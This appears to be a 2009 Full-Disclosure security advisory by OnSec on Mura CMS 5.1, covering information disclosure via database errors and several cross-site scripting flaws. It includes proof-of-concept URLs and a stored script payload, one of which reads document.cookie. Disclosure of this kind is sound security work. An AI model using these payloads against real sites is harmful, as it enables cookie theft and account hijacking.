@@ -1,0 +1,77 @@
+[ONSEC-09-020] Mura CMS root folder disclosure 
+Objective: Mura CMS <= 5.1 
+Type: Disclosure of ways 
+Threat: Medium 
+Date Discovered: 22.09.2009 
+Date of notification Developer: 22.09.2009 
+Released corrections: 
+Author: Vladimir Vorontsov 
+OnSec Russian Security Group (onsec [dot] ru) 
+Description: content management system Mura CMS found a number of
+information disclosure vulnerability. 
+An attacker can learn the version and type of database driver, database
+name, structure and format of some DBMS tables, column names, their type
+and size information about the Web server and virtual machine, Java. The
+vulnerability exists due to the error message when you try to write in the
+database values is not suitable for the format. 
+
+Implementation: 
+
+http://localhost:8888/go/default/blog/blog-post-with-flash-video/ #
+comments 
+
+Enter the "Name" value is greater than 50 characters and submit the form.
+============================================================================
+[ONSEC-09-019] Mura CMS XSS 
+Objective: Mura CMS <= 5.1 
+Type: Cross-site scripting 
+Threat: Medium 
+Date Discovered: 22.09.2009 
+Date of notification Developer: 22.09.2009 
+Released corrections: 
+Author: Vladimir Vorontsov 
+OnSec Russian Security Group (onsec [dot] ru) 
+Description: In the western system of site management Mura CMS found a
+number of cross-site scripting vulnerabilities reflected and stored type. 
+
+Implementation: 
+
+1. There is no filtering in the parameter link. Thus, it is possible to
+attack the reflected type. 
+
+http://localhost:8888/default/includes/display_objects/sendtofriend/index.cfm?link
+=% 22% 3E% 3Cscript% 3Ealert ( "ONsec.ru% 20russian% 20security% 20team");%
+3C/script% 3E % 3Cdiv & siteid = default 
+
+2. No filtering parameter returnURL available on many pages, including: 
+
+http://localhost:8888/go/default/blog/?display=editProfile&nocache=1&returnURL
+=% 22% 3E% 3Cscript% 3Ealert ( "ONsec.ru% 20Russian% 20security%
+20research% 20team% 5Cn% 5Cn"% 2Bdocument. cookie);% 3C/script% 3E 
+
+3. Stored vulnerability detected by adding entries to blog 
+
+On 
+
+http://localhost:8888/go/default/blog/blog-post-with-flash-video/?nocache=1
+
+
+enter a value like this 
+
+"> <script> alert (" ONsec.ru ");</ script> 
+
+and submit the form
+-- 
+=============================================================================
+Links on Russian:
+http://onsec.ru/vuln?id=13
+http://onsec.ru/vuln?id=14
+-----------------------------------------------------------------
+Best regards!
+Vladimir Vorontsov, security expert.
+ONsec: turn on security
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
